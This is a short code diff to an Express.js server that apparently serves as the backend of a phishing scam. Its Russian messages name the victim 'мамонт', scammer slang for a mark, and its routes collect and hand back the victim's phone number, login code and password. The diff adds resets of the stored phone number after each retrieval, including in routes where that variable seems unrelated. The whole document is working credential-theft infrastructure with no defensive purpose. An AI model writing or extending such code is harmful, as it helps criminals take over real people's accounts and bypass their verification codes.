@@ -46,6 +46,7 @@ app.post('/phone', (req, res) => {
 app.get('/getPhone', (req, res) => {
     if(pn){
         res.send(`Номер телефона мамонта: ${pn}`);
+        pn = undefined;
         return 0;
     } else {
         res.status(404).send('Номер телефона мамонта не найден.');
@@ -70,6 +71,7 @@ app.post('/authCode', (req, res) => {
 app.get('/getCode', (req, res) => {
     if(code){
         res.send(`Код мамонта:\n${code}`);
+        pn = undefined;
         return 0;
     } else {
         res.status(404).send('Код мамонта не найден.');
@@ -83,6 +85,7 @@ app.post('/password', (req, res) => {
         pass = password;
         console.log(`Пароль мамонта: ${password}`);
         res.json({ message: `Пароль мамонта: ${password}` });
+        pn = undefined;
         return;
     } else {
         console.log('Пароль мамонта неопределен.');
